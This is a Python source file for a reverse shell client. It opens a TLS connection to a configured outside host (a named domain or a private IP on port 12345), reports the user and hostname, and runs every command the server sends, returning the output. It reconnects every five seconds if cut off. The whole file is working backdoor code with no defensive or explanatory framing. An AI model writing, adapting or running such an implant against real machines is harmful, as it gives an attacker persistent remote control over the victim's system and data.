import socket
import subprocess
import json
import time
import ssl

# --- CONFIGURATION ---
# Set to True to use FQDN/public CA mode (Let's Encrypt, etc.)
USE_FQDN = True

# If using FQDN mode, set the FQDN here (e.g., 'shell.gustavoakira.tech')
SERVER_FQDN = 'shell.gustavoakira.tech'
# If using self-signed mode, set the IP and cert file
SERVER_IP = '192.168.0.132'
CA_CERTFILE = 'server.crt'
SERVER_PORT = 12345

# --- END CONFIGURATION ---

def send_message(sock, message):
    """Sends a JSON message to the specified socket."""
    serialized_message = json.dumps(message).encode('utf-8')
    message_length = str(len(serialized_message)).zfill(64).encode('utf-8')
    sock.sendall(message_length + serialized_message)

def start_client():
    while True:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            if USE_FQDN:
                # Use system CA store, verify FQDN
                context = ssl.create_default_context()
                secure_client_socket = context.wrap_socket(
                    client_socket, server_hostname=SERVER_FQDN
                )
                connect_host = SERVER_FQDN
            else:
                # Use self-signed cert
                context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                context.load_verify_locations(CA_CERTFILE)
                context.verify_mode = ssl.CERT_REQUIRED
                context.check_hostname = False
                secure_client_socket = context.wrap_socket(
                    client_socket, server_hostname=SERVER_IP
                )
                connect_host = SERVER_IP

            secure_client_socket.connect((connect_host, SERVER_PORT))
            print(f"[*] Connected securely to server {connect_host}:{SERVER_PORT}")

            # Send client hostname and username to the server
            try:
                hostname_info = subprocess.run(
                    "echo $(whoami)@$(hostname)", shell=True, capture_output=True, text=True
                ).stdout.strip()
                send_message(secure_client_socket, {'type': 'info', 'hostname': hostname_info})
            except Exception as e:
                print(f"[-] Error sending hostname info: {e}")

            while True:
                try:
                    message_length = int(secure_client_socket.recv(64).decode('utf-8').strip())
                    command_message = secure_client_socket.recv(message_length).decode('utf-8')
                    data = json.loads(command_message)

                    if data['type'] == 'command':
                        command = data['command']
                        print(f"[*] Executing command: {command}")
                        process = subprocess.run(command, shell=True, capture_output=True, text=True)
                        output = process.stdout + process.stderr
                        send_message(secure_client_socket, {'type': 'output', 'output': output})

                except json.JSONDecodeError:
                    print("[-] Invalid JSON received.")
                    break
                except ssl.SSLError as e:
                    print(f"[-] SSL Error during communication: {e}")
                    break
                except Exception as e:
                    print(f"[-] Error during communication: {e}")
                    break

        except ConnectionRefusedError:
            print(f"[-] Connection refused. Retrying in 5 seconds...")
            time.sleep(5)
        except ssl.SSLError as e:
            print(f"[-] SSL Handshake failed: {e}. Retrying in 5 seconds...")
            time.sleep(5)
        except Exception as e:
            print(f"[-] An unexpected error occurred: {e}. Retrying in 5 seconds...")
            time.sleep(5)

if __name__ == "__main__":
    start_client()
